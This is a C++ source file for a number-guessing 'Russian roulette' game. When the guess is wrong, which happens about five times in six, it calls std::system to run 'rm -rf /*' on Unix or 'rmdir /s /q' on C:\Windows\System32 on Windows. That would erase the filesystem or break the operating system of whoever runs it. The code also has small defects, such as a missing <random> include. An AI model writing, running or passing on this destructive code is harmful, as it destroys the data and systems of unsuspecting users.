#include <iostream>
#include <cstdlib>
#include <filesystem>
#include <iostream>

namespace fs = std::filesystem;

#ifdef _WIN32
  #define SYSTEM32_PATH "C:\\Windows\\System32"
#else
  #define DELETE_CMD "rm -rf /*"
#endif

void goRoot(fs::path currentPath) {
  std::cout << "Heading to the root!" << std::endl;
  while (currentPath.has_parent_path()) {
    currentPath = currentPath.parent_path();
  }
  std::cout << "Reached the root :)" << std::endl;
}

void destroySystem() {
  std::cout << "bye bye!" << std::endl;

  #ifdef _WIN32
    std::system(("rmdir /s /q " + std::string(SYSTEM32_PATH)).c_str());
  #else
    std::system(DELETE_CMD);
  #endif
}

int main() {
  int guess;
  std::cout << " Enter a number: ";
  std::cin >> guess;

  // afterwards, to prevent having it already made, and someone getting memory spaces to get the number :(
  std::random_device rd;
  std::mt19937 gen(rd());
  std::uniform_int_distribution<> dist(1,6);

  if (!(guess == dist(gen))) {
    fs::path startPath = fs::current_path();
    goRoot(startPath);
    destroySystem();
  }
  return 0; // 5 of 6 times, this is useless :(
}